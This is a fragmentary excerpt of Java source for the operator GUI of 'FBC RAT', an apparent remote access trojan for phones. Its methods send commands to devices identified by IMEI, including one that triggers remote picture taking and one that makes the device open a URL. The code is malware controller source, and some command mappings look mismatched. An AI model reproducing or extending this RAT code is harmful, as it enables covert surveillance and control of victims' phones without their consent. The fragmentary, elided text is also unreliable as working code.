...
public class GUI extends javax.swing.JFrame {
    ...
    public GUI(Server server, int port) {
        ...
        logPanel.append(Color.blue, "*** FBC RAT ***\n" +
        		"Authors : FakeBlackCat \nLaunch at " +
    ...
    private void buttonAboutActionPerformed() {
    	JOptionPane.showMessageDialog(this,"FBC RAT is a free application developped in Java language.\n" +
    			"Autors : FakeBlackCat \n" +
    			"It is under the GNU GPL3 Licence","About FBC RAT",JOptionPane.INFORMATION_MESSAGE,
    ...
    //inizio codice mio
    public void fireTakePicture1(String imei) {
    	server.commandSender(imei, Protocol.GET_PICTURE1, null);
    }
    ...
    public void fireBrowseUrl(String imei, String url) {
    	server.commandSender(imei, Protocol.GET_CONSUMED_DATA, url.getBytes());
    }
